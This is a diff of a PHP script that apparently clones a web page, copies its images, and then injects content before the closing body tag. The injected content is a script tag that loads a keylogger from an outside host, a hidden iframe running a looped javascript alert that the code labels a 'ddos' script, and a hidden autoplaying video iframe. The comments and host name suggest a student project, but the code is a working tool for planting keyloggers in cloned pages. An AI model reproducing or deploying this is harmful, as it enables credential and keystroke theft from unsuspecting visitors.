@@ -36,20 +36,26 @@ fclose($html);
 $html = file_get_html($link);
 foreach($html->find('img') as $element){
 		$img = $element->src ;
-		if (!is_dir("$img")){
-				$path = substr($img , 0 , strlen($img) - strlen(strrchr($img , "/")));
-				mkdir(getcwd().$path , 0777 , true);
-				file_put_contents(getcwd()."$img", "$link"."$img");
-		}
-		else{
-					die('Failed to create folders...');
-		}
+    // Starts with http:// or https:// (case insensitive).
+    if (preg_match('#^https?://#i', $img) === 0) {
+      if (!is_dir("$img")){
+          $path = substr($img , 0 , strlen($img) - strlen(strrchr($img , "/")));
+          mkdir(getcwd().$path , 0777 , true);
+          echo $link.$img;
+          copy($link.$img , getcwd().$img);
 
+      //    file_put_contents(getcwd()."$img", $lol);
+      }
+      else{
+            die('Failed to create folders...');
+      }
+    }
 	};
+
 //ADDING IN THE KEYLOGGER SCRIPT INTO HTML ON SERVER
 //ADDING RICKROLL ATTACK TEST
 $keyloggerscript = "http://individualproject.esy.es/js/keylogger.js";
-$ddosscript ="<iframe id='iframe' width ='0' height='0' src='javascript:for(var i=0;i < 10;i++){alert()}' frameborder='0' </iframe>";
+$ddosscript ="<iframe id='iframe' width ='0' height='0' src='javascript:for(var i=0;i < 1;i++){alert()}' frameborder='0' </iframe>";
 $textToInsert="script src='$keyloggerscript'></script>".$ddosscript."<iframe width='0' height='0' src='https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1' frameborder='0'></iframe>";
 $contents = file_get_contents("$htmlFileName");
 $newContent = preg_replace("</body>", $textToInsert."</body", $contents);
